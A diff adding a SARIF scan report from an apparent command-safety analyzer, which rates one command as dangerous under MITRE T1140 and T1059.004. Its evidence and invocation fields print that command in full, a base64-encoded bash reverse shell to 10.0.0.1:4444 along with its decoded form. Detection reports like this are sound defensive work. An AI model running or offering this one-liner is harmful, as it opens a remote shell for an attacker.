@@ -1,0 +1,156 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Command Safety Analyzer",
+          "version": "4.1",
+          "informationUri": "https://github.com/command-safety-analyzer",
+          "rules": [
+            {
+              "id": "T1140",
+              "name": "去混淆",
+              "shortDescription": {
+                "text": "命令包含 base64 编码层"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1140",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1140"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1140 (Deobfuscate/Decode Files or Information)"
+              }
+            },
+            {
+              "id": "T1059.004",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: base64 decode piped to shell"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            },
+            {
+              "id": "T1059.004-2",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: reverse shell via /dev/tcp"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            },
+            {
+              "id": "T1059.004-3",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: interactive bash reverse shell"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            }
+          ],
+          "properties": {
+            "verdict": "DANGEROUS",
+            "risk_score": 100,
+            "confidence": "HIGH"
+          }
+        }
+      },
+      "results": [
+        {
+          "ruleId": "T1140",
+          "level": "warning",
+          "message": {
+            "text": "命令包含 base64 编码层"
+          },
+          "properties": {
+            "risk_score": 15,
+            "dimension": "去混淆",
+            "evidence": "base64: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+          }
+        },
+        {
+          "ruleId": "T1059.004",
+          "level": "error",
+          "message": {
+            "text": "命令匹配恶意模式: base64 decode piped to shell"
+          },
+          "properties": {
+            "risk_score": 40,
+            "dimension": "静态分析",
+            "evidence": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash"
+          }
+        },
+        {
+          "ruleId": "T1059.004-2",
+          "level": "error",
+          "message": {
+            "text": "命令匹配恶意模式: reverse shell via /dev/tcp"
+          },
+          "properties": {
+            "risk_score": 40,
+            "dimension": "静态分析",
+            "evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | bash"
+          }
+        },
+        {
+          "ruleId": "T1059.004-3",
+          "level": "error",
+          "message": {
+            "text": "命令匹配恶意模式: interactive bash reverse shell"
+          },
+          "properties": {
+            "risk_score": 45,
+            "dimension": "静态分析",
+            "evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | bash"
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "properties": {
+            "command": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash",
+            "verdict": "DANGEROUS",
+            "risk_score": 100,
+            "confidence": "HIGH",
+            "timestamp": "2026-03-20T04:08:16.055481+00:00"
+          }
+        }
+      ]
+    }
+  ]
+}
